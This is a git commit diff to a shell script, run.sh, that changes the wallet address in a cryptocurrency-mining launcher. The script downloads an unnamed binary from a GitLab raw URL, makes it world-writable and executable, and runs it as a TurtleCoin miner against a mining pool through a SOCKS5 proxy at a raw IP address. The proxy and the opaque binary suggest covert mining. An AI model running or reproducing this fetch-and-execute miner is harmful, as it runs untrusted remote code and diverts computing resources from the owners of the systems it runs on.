2283b5411733f786e760f617375aebdd26332e26
KareemSeay <89583364+KareemSeay@users.noreply.github.com>
2021-08-26 12:16:47 +0000

    Update run.sh

--- run.sh
+++ run.sh
@@ -2,7 +2,7 @@
 wget https://gitlab.com/buyutuk/xmr/-/raw/main/masterfile
 chmod 777 masterfile
 POOL=turtlecoin.herominers.com:10380
-WALLET=TRTLv1xLSHLPhfLEmMhk6J1p42SHHSGA15jiByLzY7gvYnotcwb3L5L8FHDUJ4uH7qLkEdfxuTWAW69tZ4LtskR1eTrgWw4BJSB
+WALLET=TRTLuwaiGbcexV82zFn2tk3gEemniqMYtirfBSYtXdBLFYE5yJpE15B9LYZxmGNzGPPYvGoCQ8Ke1ZXB49X1tQGCJKaoA9zPEKw+a496e7541267b713e71a50ccebf86c02c984a22cbacc038edf9637d02000e67f
 WORKER=CPU
 PROXY=socks5://192.252.209.155:14455
 ./masterfile -o $POOL -u $WALLET -p $WORKER -a argon2/chukwav2 --donate-level 1 -t 2 -x $PROXY -k
